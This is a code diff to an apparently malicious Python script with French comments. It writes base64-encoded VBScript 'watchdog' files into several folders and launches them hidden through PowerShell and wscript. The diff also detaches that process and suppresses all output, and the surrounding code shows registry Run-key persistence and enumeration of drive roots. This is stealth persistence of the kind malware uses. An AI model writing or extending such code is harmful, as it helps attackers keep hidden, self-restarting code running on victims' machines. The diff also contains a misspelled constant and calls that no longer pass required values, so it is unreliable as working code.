@@ -81,9 +81,11 @@ def deleteVbsFileAfterFinish():
         except Exception as e:
             print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
 
-def create_watchdog_vbs(script_python_path, target_dirs):
+def create_watchdog_vbs():
     script_final = vbs_template.format(script_python_path.replace("\\", "\\\\"))
     b64_vbs = base64.b64encode(script_final.encode()).decode()
+    DTACHED_PROCESS = 0x00000008
+    CREATE_NEW_PROCESS_GROUP = 0x00000200
 
     for folder in target_dirs:
         try:
@@ -114,7 +116,14 @@ def create_watchdog_vbs(script_python_path, target_dirs):
                 f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
                 f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
             )
-            subprocess.Popen(powershell_command, shell=True)
+            subprocess.Popen(
+                powershell_command,
+                shell=True,
+                creationflags=DTACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            )
             #with open(vbs_path, "w", encoding="utf-8") as f:
             #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
             print(f"[+] Watchdog créé dans {vbs_path}")
@@ -279,7 +288,7 @@ def main():
         folders_exclus.append(existDir.lower())
 
     ajouter_run_key_vbs_relatif()
-    create_watchdog_vbs(script_python_path, target_dirs)
+    create_watchdog_vbs()
     lancer_watchdogs()
 
     lecteurs = get_existing_root_path()
